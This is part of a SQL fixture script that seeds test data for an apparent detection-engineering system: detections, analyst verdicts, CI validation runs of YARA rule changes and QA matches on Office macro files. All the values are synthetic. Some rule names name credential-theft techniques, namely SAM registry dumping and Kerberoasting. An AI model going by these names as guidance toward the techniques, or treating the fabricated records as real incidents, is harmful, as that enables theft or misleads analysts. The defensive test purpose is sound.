    PERFORM pg_temp.capture(7, 'PE_Net_User_Add: local account created on kiosk-05', '8 days',
                            'INSTALLATION', 'setup_kiosk.cmd', 'setup_kiosk.cmd', ARRAY[net, enc], 1307);
    PERFORM pg_temp.capture(8, 'PE_Net_User_Add: local account created on helpdesk-ws-02', '2 days',
                            'FALSE_POSITIVE', 'new_starter.cmd', 'new_starter.cmd', ARRAY[net], 842);
END
$$;
-- someone confirmed one by hand
INSERT INTO analysis.detection_verdicts (detection_id, root_id, signature_uuid, verdict, set_by, set_at)
SELECT d.id, d.root_id, d.signature_uuid, 'tp', pg_temp.person('bob'), now() - interval '5 days'
FROM analysis.detections d
WHERE d.root_id = '5a3b1e04-0000-4000-8000-000000000000';

-- ---- validations: what CI asked for ----

CREATE FUNCTION pg_temp.ci() RETURNS jsonb LANGUAGE sql AS $$
    SELECT '{"kind": "api_key", "id": "c1c1c1c1-0000-4000-8000-000000000001", "name": "ci-detection-rules", "owner": null}'::jsonb
$$;
CREATE FUNCTION pg_temp.side(p_sha text, p_rules integer) RETURNS jsonb LANGUAGE sql AS $$
    SELECT jsonb_build_object('sha', p_sha, 'namespaces', jsonb_build_array('detection_rules'), 'rule_count', p_rules,
                              'file_errors', '[]'::jsonb, 'not_loaded', '[]'::jsonb, 'skipped_members', '[]'::jsonb,
                              'warnings', '[]'::jsonb, 'ruleset_error', NULL)
$$;
CREATE FUNCTION pg_temp.report(p_base text, p_head text, p_changed jsonb, p_added jsonb) RETURNS jsonb LANGUAGE sql AS $$
    SELECT jsonb_build_object('base', pg_temp.side(p_base, 43), 'head', pg_temp.side(p_head, 43 + jsonb_array_length(p_added)),
                              'added_rules', p_added, 'removed_rules', '[]'::jsonb, 'changed_rules', p_changed,
                              'not_testable', '[]'::jsonb, 'full_path_rules', '[]'::jsonb, 'skipped', '[]'::jsonb,
                              'files', 6, 'units', 9, 'samples', 9, 'bytes', 155886, 'duration_seconds', 3.4)
$$;

INSERT INTO svs.validations
    (uuid, repository, base_sha, head_sha, branch, pr_url, requested_by, created_at, state, active_key,
     claim_token, claimed_by, heartbeat_at, attempts, started_at, finished_at, error, corpus_version,
     engine_fingerprint, counts, report, regressions, new_fps, compile_errors, diffed)
VALUES
    ('7a11da7e-0000-4000-8000-000000000001', 'detection_rules', repeat('1a', 20), repeat('2b', 20),
     'tune-sam-save', 'https://git.example.com/detection/detection_rules/pull/212', pg_temp.ci(),
     now() - interval '27 hours', 'completed', NULL, NULL, 'ace-1', NULL, 1, now() - interval '27 hours' + interval '4 seconds',
     now() - interval '27 hours' + interval '9 seconds', NULL, 'c-41', 'yara-x 1.22.1',
     '{"regression": 1, "unchanged": 8}',
     pg_temp.report(repeat('1a', 20), repeat('2b', 20),
                    '[{"uuid": "5160a000-0000-4000-8000-000000000004", "name": "CA_Registry_SAM_Save", "file": "credential_access/registry.yar"}]', '[]'),
     1, 0, 0, true),
    ('7a11da7e-0000-4000-8000-000000000002', 'detection_rules', repeat('2b', 20), repeat('3c', 20),
     'kerberoast-encoded', 'https://git.example.com/detection/detection_rules/pull/215', pg_temp.ci(),
     now() - interval '20 hours', 'completed', NULL, NULL, 'ace-1', NULL, 1, now() - interval '20 hours' + interval '3 seconds',
     now() - interval '20 hours' + interval '8 seconds', NULL, 'c-41', 'yara-x 1.22.1',
     '{"new_fp_other_rule": 1, "new_match_real_hit": 1, "unchanged": 8}',
     pg_temp.report(repeat('2b', 20), repeat('3c', 20), '[]',
                    '[{"uuid": "5160a000-0000-4000-8000-00000000000c", "name": "CA_PowerShell_Kerberoast_Encoded", "file": "credential_access/kerberos.yar"}]'),
     0, 1, 0, true),
    ('7a11da7e-0000-4000-8000-000000000003', 'detection_rules', repeat('3c', 20), repeat('4d', 20),
     'fix-service-binpath', 'https://git.example.com/detection/detection_rules/pull/217', pg_temp.ci(),
     now() - interval '6 hours', 'failed', NULL, NULL, 'ace-1', NULL, 3, now() - interval '6 hours' + interval '2 seconds',
     now() - interval '6 hours' + interval '40 seconds',
     'the head commit ' || repeat('4d', 20) || ' is not in repository detection_rules', NULL, NULL, NULL, NULL,
     NULL, NULL, NULL, NULL),
    ('7a11da7e-0000-4000-8000-000000000004', 'detection_rules', repeat('3c', 20), repeat('5e', 20),
     'add-net-user-rule', 'https://git.example.com/detection/detection_rules/pull/218', pg_temp.ci(),
     now() - interval '3 hours', 'completed', NULL, NULL, 'ace-1', NULL, 1, now() - interval '3 hours' + interval '3 seconds',
     now() - interval '3 hours' + interval '7 seconds', NULL, 'c-42', 'yara-x 1.22.1',
     '{"unchanged": 9}', pg_temp.report(repeat('3c', 20), repeat('5e', 20), '[]', '[]'), 0, 0, 0, true),
    ('7a11da7e-0000-4000-8000-000000000005', 'detection_rules', repeat('5e', 20), repeat('6f', 20),
     'lnk-startup-folder', NULL, pg_temp.person('alice'), now() - interval '90 seconds', 'running', repeat('ab', 32),
     '7a11da7e-0000-4000-8000-0000000000ff', 'ace-1', now() - interval '10 seconds', 1, now() - interval '80 seconds',
     NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

INSERT INTO svs.validation_results
    (validation_id, sha256, rule_uuid, rule_name, namespace, label, label_source, base, head, raw_base, raw_head,
     category, note)
SELECT v.id, encode(sha256(convert_to(r.seed, 'UTF8')), 'hex'), r.rule_uuid, r.rule_name, 'detection_rules',
       r.label, r.label_source, r.base, r.head, r.base = 'match', r.head = 'match', r.category, r.note
FROM (VALUES
    ('7a11da7e-0000-4000-8000-000000000001', 'sam.save one', '5160a000-0000-4000-8000-000000000004',
     'CA_Registry_SAM_Save', 'tp', 'inherited_single', 'match', 'miss', 'regression',
     'a TP sample the rule no longer matches'),
    ('7a11da7e-0000-4000-8000-000000000002', 'deploy_agent.ps1', '5160a000-0000-4000-8000-00000000000c',
     'CA_PowerShell_Kerberoast_Encoded', NULL, NULL, 'miss', 'match', 'new_fp_other_rule',
     'the file is a false positive for EX_PowerShell_Encoded_Command'),
    ('7a11da7e-0000-4000-8000-000000000002', 'invoice_viewer.ps1', '5160a000-0000-4000-8000-00000000000c',
     'CA_PowerShell_Kerberoast_Encoded', NULL, NULL, 'miss', 'match', 'new_match_real_hit',
     'the file is a true positive for EX_PowerShell_Encoded_Command')
) AS r (validation, seed, rule_uuid, rule_name, label, label_source, base, head, category, note)
JOIN svs.validations v ON v.uuid = r.validation::uuid;

-- ---- YARA QA: the files a rule in QA mode matched ----

INSERT INTO analysis.roots (id, analysis_mode, description, event_time_source, created_at, pass, completed_pass)
VALUES ('9a000000-0000-4000-8000-000000000001', 'email', 'An email with an attachment', 'unset',
        now() - interval '2 days', 1, 1);
INSERT INTO yara.qa_matches
    (signature_uuid, signature_version, rule, namespace, ruleset, sha256, file_path, root_id, observable_id,
     match, hit_count, first_seen, last_seen, expires_at)
SELECT '5160a000-0000-4000-8000-00000000000b', q.version, 'QA_Office_Macro_Shell', 'detection_rules', repeat('5e', 32),
       encode(sha256(convert_to(q.file, 'UTF8')), 'hex'), q.file, '9a000000-0000-4000-8000-000000000001', 1,
       jsonb_build_object('rule', 'QA_Office_Macro_Shell', 'strings', jsonb_build_array(jsonb_build_object('identifier', '$shell', 'offset', 2048, 'length', 5))),
       q.hits, now() - q.first, now() - q.last, now() + interval '20 days'
FROM (VALUES
    ('feedface00feedface00feedface00feedface00', 'quarterly_report.docm', 7, interval '30 hours', interval '2 hours'),
    ('feedface00feedface00feedface00feedface00', 'timesheet_template.xlsm', 3, interval '26 hours', interval '5 hours'),
    ('feedface00feedface00feedface00feedface00', 'order_form.docm', 1, interval '9 hours', interval '9 hours'),
    ('0ddba11000ddba11000ddba11000ddba11000dd0', 'quarterly_report.docm', 12, interval '9 days', interval '3 days'),
    ('0ddba11000ddba11000ddba11000ddba11000dd0', 'macro_helpers.xlam', 4, interval '8 days', interval '4 days')
) AS q (version, file, hits, first, last);
INSERT INTO store.objects (pool, sha256, size, mime_type)
SELECT 'yara_qa', encode(sha256(convert_to(file, 'UTF8')), 'hex'), size, 'application/octet-stream'
FROM (VALUES ('quarterly_report.docm', 48211), ('timesheet_template.xlsm', 20934), ('order_form.docm', 31007),
             ('macro_helpers.xlam', 15872)) AS f (file, size)
ON CONFLICT DO NOTHING;

COMMIT;
